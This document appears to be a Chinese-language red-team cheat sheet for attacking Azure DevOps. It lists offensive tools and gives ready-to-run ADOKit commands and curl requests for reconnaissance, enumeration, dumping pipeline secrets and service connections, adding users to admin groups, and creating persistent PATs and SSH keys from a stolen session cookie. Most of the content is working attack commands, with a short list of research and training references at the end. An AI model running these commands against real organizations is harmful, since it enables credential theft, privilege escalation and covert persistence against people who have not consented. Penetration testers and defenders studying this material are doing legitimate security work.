# Azure 服务 - Azure DevOps

* [xforcered/ADOKit](https://github.com/xforcered/ADOKit) - Azure DevOps 服务攻击工具包
* [zolderio/devops](https://github.com/zolderio/devops) - Azure DevOps 访问测试脚本
* [synacktiv/nord-stream](https://github.com/synacktiv/nord-stream) - Nord Stream 是一款允许你通过部署恶意流水线 (pipelines) 来提取 CI/CD 环境中存储的机密 (secrets) 的工具。目前支持 Azure DevOps、GitHub 和 GitLab。

    ```ps1
    # 列出所有项目中的所有机密
    $ nord-stream.py devops --token "$PAT" --org myorg --list-secrets

    # 转储所有项目中的所有机密
    $ nord-stream.py devops --token "$PAT" --org myorg
    ```

## 身份验证 (Authentication)

你可以通过 <https://dev.azure.com/{你的组织名称}> 访问组织的 Azure DevOps 服务实例。

* 用户名和密码 (Username and Password)
* 身份验证 Cookie `UserAuthentication`: `ADOKit.exe whoami /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization`
* 个人访问令牌 (PAT): `ADOKit.exe whoami /credential:patToken /url:https://dev.azure.com/YourOrganization`

    ```ps1
    PAT="XXXXXXXXXXX"
    organization="YOURORGANIZATION"
    curl -u :${PAT} https://dev.azure.com/${organization}/_apis/build-release/builds
    ```

* 带有 FOCI (MS Authenticator) 的访问令牌

    ```ps1
    roadtx auth --device-code -c 4813382a-8fa7-425e-ab75-3b753aab3abb
    roadtx refreshtokento -c 1950a258-227b-4e31-a9cf-717495945fc2 -r 499b84ac-1321-427f-aa17-267ca6975798/.default
    python main.py --token $(jq -r '.accessToken' .roadtools_auth) repositories
    ```

## 侦察 (Recon)

* 搜索文件：`file:FileNameToSearch`, `file:Test* OR file:azure-pipelines*`

  ```ps1
  curl -i -s -k -X $'GET'
  -H $'Content-Type: application/json'
  -H $'User-Agent: SOME_USER_AGENT'
  -H $'Authorization: Basic BASE64ENCODEDPAT'
  -H $'Host: dev.azure.com'
  $'https://dev.azure.com/YOURORGANIZATION/PROJECTNAME/_apis/git/repositories/REPOSITORYID/items?recursionLevel=Full&api-version=7.0'
  ```

* 搜索代码：`ADOKit.exe searchcode /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /search:"搜索词"`

  ```ps1
  curl -i -s -k -X $'POST'
  -H $'Content-Type: application/json'
  -H $'User-Agent: SOME_USER_AGENT'
  -H $'Authorization: Basic BASE64ENCODEDPAT'
  -H $'Host: almsearch.dev.azure.com'
  -H $'Content-Length: 85'
  -H $'Expect: 100-continue'
  -H $'Connection: close'
  --data-binary $'{\"searchText\": \"SEARCHTERM\", \"skipResults\":0,\"takeResults\":1000,\"isInstantSearch\":true}' 
  $'https://almsearch.dev.azure.com/YOURORGANIZATION/_apis/search/codeAdvancedQueryResults?api-version=7.0-preview'
  ```

* 枚举用户 (Enumerate users)

  ```ps1
  curl -i -s -k -X $'GET'
  -H $'Content-Type: application/json'
  -H $'User-Agent: SOME_USER_AGENT'
  -H $'Authorization: Basic BASE64ENCODEDPAT'
  -H $'Host: dev.azure.com'
  $'https://dev.azure.com/YOURORGANIZATION/_apis/graph/users?api-version=7.0'
  ```

* 枚举组 (Enumerate groups)：`ADOKit.exe getgroupmembers /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /group:"搜索词"`

  ```ps1
  curl -i -s -k -X $'GET'
  -H $'Content-Type: application/json'
  -H $'User-Agent: SOME_USER_AGENT'
  -H $'Authorization: Basic BASE64ENCODEDPAT'
  -H $'Host: dev.azure.com'
  $'https://dev.azure.com/YOURORGANIZATION/_apis/graph/groups?api-version=7.0'
  ```

* 枚举项目权限：`ADOKit.exe getpermissions /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:"项目名称"`

* 从访问令牌 (access_token) 获取用户档案：<https://app.vssps.visualstudio.com/_apis/profile/profiles/me?api-version=7.1>
* 获取用户所属的组织：<https://app.vssps.visualstudio.com/_apis/accounts?memberId={UserID}?api-version=7.1>
* 获取该组织内的存储库 (repositories)：<https://dev.azure.com/{组织名称}/_apis/projects?api-version=7.1>

## 权限提升 (Privilege Escalation)

* 将用户添加到组：`ADOKit.exe addcollectionbuildadmin /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /user:"用户名"`

    ```ps1
    curl -i -s -k -X $'PUT'
    -H $'Content-Type: application/json'
    -H $'User-Agent: Some User Agent'
    -H $'Authorization: Basic base64EncodedPAT'
    -H $'Host: vssps.dev.azure.com'
    -H $'Content-Length: 0'
    $'https://vssps.dev.azure.com/YourOrganization/_apis/graph/memberships/userDescriptor/groupDescriptor?api-version=7.0-preview.1'
    ```

* 检回构建变量和机密 (build variables and secrets)：`ADOKit.exe getpipelinevars /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:"项目名称"`, `ADOKit.exe getpipelinesecrets /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:"项目名称"`

    ```ps1
    curl -i -s -k -X $'GET'
    -H $'Content-Type: application/json'
    -H $'User-Agent: Some User Agent'
    -H $'Authorization: Basic base64EncodedPAT'
    -H $'Host: dev.azure.com'
    $'https://dev.azure.com/YourOrganization/ProjectName/_apis/build/Definitions/DefinitionIDNumber?api-version=7.0'
    ```

* 获取服务连接信息 (Service Connection Information)：`ADOKit.exe getserviceconnections /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:"项目名称"`

    ```ps1
    curl -i -s -k -X $'GET'
    -H $'Content-Type: application/json;api-version=5.0-preview.1'
    -H $'User-Agent: Some User Agent'
    -H $'Authorization: Basic base64EncodedPAT'
    -H $'Host: dev.azure.com'
    $'https://dev.azure.com/YourOrganization/YourProject/_apis/serviceendpoint/endpoints?api-version=7.0'
    ```

## 持久化 (Persistence)

* 创建 PAT：`ADOKit.exe createpat /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization`

    ```ps1
    curl -i -s -k -X $'POST'
    -H $'Content-Type: application/json'
    -H $'Accept: application/json;api-version=5.0-preview.1'
    -H $'User-Agent: Some User Agent'
    -H $'Host: dev.azure.com'
    -H $'Content-Length: 234'
    -H $'Expect: 100-continue'
    -b $'X-VSS-UseRequestRouting=True; UserAuthentication=stolenCookie'
    --data-binary $'{\"contributionIds\":[\"ms.vss-token-web.personal-accesstoken-issue-session-tokenprovider\"],\"dataProviderContext\":{\"properties\":{\"displayName\":\"PATName\",\"validTo\":\"YYYY-MMDDT00:00:00.000Z\",\"scope\":\"app_token\",\"targetAccounts\":[]}}}}}'
    $'https://dev.azure.com/YourOrganization/_apis/Contribution/HierarchyQuery'
    ```

* 创建 SSH 密钥：`ADOKit.exe createsshkey /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /sshkey:"ssh 公钥"`

    ```ps1
    curl -i -s -k -X $'POST'
    -H $'Content-Type: application/json'
    -H $'Accept: application/json;api-version=5.0-preview.1'
    -H $'User-Agent: Some User Agent'
    -H $'Host: dev.azure.com'
    -H $'Content-Length: 856'
    -H $'Expect: 100-continue'
    -b $'X-VSS-UseRequestRouting=True; UserAuthentication=stolenCookie'
    --data-binary $'{\"contributionIds\":[\"ms.vss-token-web.personal-accesstoken-issue-session-tokenprovider\"],\"dataProviderContext\":{\"properties\":{\"displayName\":\"SSHKeyName\",\"publicData\":\"公钥 SSH 内容\",\"validTo\":\"YYYY-MMDDT00:00:00.000Z\",\"scope\":\"app_token\",\"isPublic\":true,\"targetAccounts\":[\"组织 ID\"]}}}}}'
    $'https://dev.azure.com/YourOrganization/_apis/Contribution/HierarchyQuery'
    ```

## 参考资料 (References)

* [Hiding in the Clouds: Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic Rules - Brett Hawkins - November 6, 2023](https://www.ibm.com/downloads/cas/5JKAPVYD)
* [DevOps access is closer than you assume - rikvduijn - January 21, 2025](https://zolder.io/blog/devops-access-is-closer-than-you-assume/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
